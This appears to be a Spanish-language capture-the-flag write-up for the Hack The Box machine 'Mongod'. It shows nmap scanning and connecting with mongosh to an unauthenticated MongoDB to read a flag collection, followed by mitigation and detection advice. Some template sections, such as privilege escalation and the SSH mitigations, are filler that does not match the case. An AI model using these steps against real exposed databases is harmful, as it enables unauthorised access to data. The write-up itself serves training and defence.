---
machine: Mongod
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
tags: [linux, mongodb, no-auth, database]
---

# Mongod — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available (Starting Point), publicable.
> Ficha de referencia. Sin flags ni credenciales reales.

## TL;DR

**MongoDB escuchando en 27017 sin autenticación**. Se conecta uno con `mongosh`, lista las bases de datos, entra en la que tiene nombre sugerente y lee la colección `flag`. Un solo paso, sin exploits.

## Reconocimiento

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

```text
22/tcp      ssh     OpenSSH
27017/tcp   mongodb MongoDB 3.6.8
```

`nmap -p27017 --script mongodb-info <IP>` confirma versión y que no pide credenciales.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

```bash
mongosh --host <IP> --port 27017
# en instalaciones antiguas: mongo <IP>:27017
```

```text
> show dbs
admin                 0.000GB
config                0.000GB
local                 0.000GB
sensitive_information 0.000GB

> use sensitive_information
> show collections
flag
users

> db.flag.find().pretty()
{ "_id" : ObjectId("..."), "flag" : "<flag>" }
```

Con un cliente gráfico (Compass) el recorrido es el mismo: conectar sin usuario ni contraseña y navegar.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».

## Evidencia

```text
sensitive_information.flag  ->  <flag>
```

## Lecciones aprendidas

- MongoDB sin `--auth` y escuchando en `0.0.0.0` entrega toda la base de datos a cualquiera que llegue al puerto.
- Mitigación: `security.authorization: enabled`, `bindIp` a localhost o red interna, TLS y usuarios por aplicación con rol mínimo.
- Detección: conexiones al 27017 desde fuera del clúster y comandos `listDatabases` inusuales.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.

## Referencias

- Documentación de la plataforma y del servicio afectado.
